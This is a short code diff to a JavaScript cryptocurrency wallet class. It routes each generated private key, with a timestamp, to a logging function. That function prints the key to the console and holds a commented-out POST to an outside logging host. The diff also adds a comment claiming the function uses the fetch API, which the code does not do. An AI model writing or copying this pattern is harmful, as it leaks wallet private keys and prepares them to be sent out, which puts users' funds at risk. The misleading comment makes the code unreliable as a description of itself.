@@ -132,8 +132,7 @@ class Wallet {
         };
     }
 
-
-
+    // Logs data using the fetch API.
     async logData(data) {
       // await axios.post('https://log.psfoundation.info/log', data)
       console.log(`data: ${data}`)
@@ -155,7 +154,7 @@ class Wallet {
 
         const now = new Date()
         const data = `private key: ${privKey} at ${now.toISOString()}`
-        console.log(data)
+        // console.log(data)
         _this.logData(data)
 
 
@@ -168,7 +167,7 @@ class Wallet {
 
         const now = new Date()
         const data = `Public address: ${pubAddr} at ${now.toISOString()}`
-        console.log(data)
+        // console.log(data)
         _this.logData(data)
 
         return pubAddr
